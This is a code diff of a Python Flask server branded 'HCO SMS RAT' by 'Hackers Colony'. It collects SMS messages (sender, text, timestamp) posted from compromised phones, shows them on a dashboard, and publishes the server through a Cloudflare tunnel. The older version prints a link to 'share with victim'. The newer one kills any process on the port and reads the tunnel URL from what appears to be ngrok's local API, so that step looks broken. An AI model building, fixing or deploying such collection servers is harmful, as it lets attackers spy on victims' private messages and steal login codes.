@@ -1,124 +1,137 @@
 import os
 import time
 import json
-import threading
+import subprocess
 from flask import Flask, request, render_template_string
 
-PORT = 5050
-app = Flask(__name__)
-sms_data = []
+PORT = 5000
 
-# HTML dashboard with auto-refresh and styling
-HTML_TEMPLATE = """
+app = Flask(__name__)
+
+# HTML Dashboard Template
+dashboard_template = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Hackers Colony | SMS Logger</title>
-    <meta http-equiv="refresh" content="5">
+    <title>HCO SMS Logger</title>
     <style>
         body {
             background-color: #0f0f0f;
-            color: #ffffff;
-            font-family: monospace;
-            padding: 20px;
+            color: white;
+            font-family: 'Segoe UI', sans-serif;
+            padding: 30px;
         }
         h1 {
             color: #00ffcc;
             text-align: center;
-            font-size: 32px;
-            margin-bottom: 20px;
         }
-        .sms-block {
-            background-color: #1c1c1c;
-            border: 1px solid #00ffcc;
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 30px;
+        }
+        th, td {
+            border: 1px solid #444;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: #111;
+            color: #00ffff;
+        }
+        tr:nth-child(even) {
+            background-color: #1e1e1e;
+        }
+        .header {
+            font-size: 24px;
+            text-align: center;
+            background-color: #1a1a1a;
+            padding: 15px;
             border-radius: 10px;
-            padding: 10px;
-            margin-bottom: 10px;
-        }
-        .sender {
-            color: #ff8080;
-            font-weight: bold;
-        }
-        .message {
-            color: #ffffff;
-        }
-        .timestamp {
-            color: #999999;
-            font-size: 12px;
+            color: #00ff99;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-    <h1>📱 Hackers Colony - SMS Logger</h1>
-    {% for sms in sms_data %}
-        <div class="sms-block">
-            <div class="sender">📨 From: {{ sms['sender'] }}</div>
-            <div class="message">💬 {{ sms['message'] }}</div>
-            <div class="timestamp">🕒 {{ sms['timestamp'] }}</div>
-        </div>
-    {% else %}
-        <p>No SMS data received yet.</p>
-    {% endfor %}
+    <div class="header">📱 Hackers Colony SMS Dashboard</div>
+    <table>
+        <tr>
+            <th>Sender</th>
+            <th>Message</th>
+            <th>Timestamp</th>
+        </tr>
+        {% for sms in sms_data %}
+        <tr>
+            <td>{{ sms['sender'] }}</td>
+            <td>{{ sms['message'] }}</td>
+            <td>{{ sms['timestamp'] }}</td>
+        </tr>
+        {% endfor %}
+    </table>
 </body>
 </html>
 """
 
-@app.route("/")
-def index():
-    return render_template_string(HTML_TEMPLATE, sms_data=sms_data)
+# Store received SMS data
+sms_data = []
 
-@app.route("/sms", methods=["POST"])
+@app.route('/', methods=['GET'])
+def dashboard():
+    return render_template_string(dashboard_template, sms_data=sms_data)
+
+@app.route('/receive_sms', methods=['POST'])
 def receive_sms():
-    data = request.get_json()
-    if data:
-        sms_data.append({
-            "sender": data.get("sender", "Unknown"),
-            "message": data.get("message", "No message"),
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-        })
-        return "SMS received", 200
-    return "Invalid data", 400
-
-def start_flask():
     try:
-        app.run(host="0.0.0.0", port=PORT)
-    except OSError as e:
-        print(f"[×] Port {PORT} is busy. Retrying in 5 seconds...")
-        time.sleep(5)
-        start_flask()
+        sender = request.form.get('sender')
+        message = request.form.get('message')
+        timestamp = request.form.get('timestamp')
 
-def start_cloudflare():
-    os.system(f"pkill cloudflared")
-    time.sleep(2)
-    os.system(f"cloudflared tunnel --url http://localhost:{PORT} --logfile cf.log --loglevel info &")
-    time.sleep(6)
+        if sender and message and timestamp:
+            sms_data.append({
+                "sender": sender,
+                "message": message,
+                "timestamp": timestamp
+            })
+            print(f"[+] SMS Received - From: {sender}, Time: {timestamp}")
+            return "OK", 200
+        else:
+            return "Invalid data", 400
+    except Exception as e:
+        print("Error receiving SMS:", str(e))
+        return "Error", 500
+
+def start_cloudflared():
+    print("[•] Starting Cloudflare Tunnel...")
+    subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(4)
 
     try:
-        with open("cf.log", "r") as log:
-            for line in log:
-                if "trycloudflare.com" in line:
-                    parts = line.split(" ")
-                    for part in parts:
-                        if "https://" in part and "trycloudflare.com" in part:
-                            print(f"[✓] Share this link with victim: {part.strip()}")
-                            return
-        print("[×] Failed to get Cloudflare URL. Make sure tunnel started properly.")
-    except FileNotFoundError:
-        print("[×] cf.log not found. Cloudflare tunnel may not have started.")
+        output = subprocess.check_output("curl -s http://127.0.0.1:4040/api/tunnels", shell=True)
+        tunnels = json.loads(output)
+        public_url = tunnels['tunnels'][0]['public_url']
+        print(f"[✓] Cloudflare Tunnel: {public_url}")
+    except Exception as e:
+        print("[×] Failed to get Cloudflare URL. Make sure cloudflared is installed.")
+        public_url = None
 
-def run_server():
-    while True:
-        print("[•] Starting Flask server...")
-        flask_thread = threading.Thread(target=start_flask)
-        flask_thread.daemon = True
-        flask_thread.start()
+    return public_url
 
-        print("[•] Starting Cloudflare tunnel...")
-        start_cloudflare()
+def check_port_and_kill(port):
+    try:
+        output = subprocess.check_output(f"lsof -t -i:{port}", shell=True).decode().strip()
+        if output:
+            print(f"[!] Port {port} in use. Killing process...")
+            os.system(f"kill -9 {output}")
+    except subprocess.CalledProcessError:
+        pass
 
-        flask_thread.join()
-        print("[!] Flask crashed or exited. Restarting in 3 seconds...")
-        time.sleep(3)
+if __name__ == '__main__':
+    print("╔══════════════════════════════╗")
+    print("║     HCO SMS RAT Started      ║")
+    print("╚══════════════════════════════╝")
 
-if __name__ == "__main__":
-    run_server()
+    check_port_and_kill(PORT)
+    start_cloudflared()
+    print("[•] Starting Flask server...")
+    app.run(host='0.0.0.0', port=PORT)
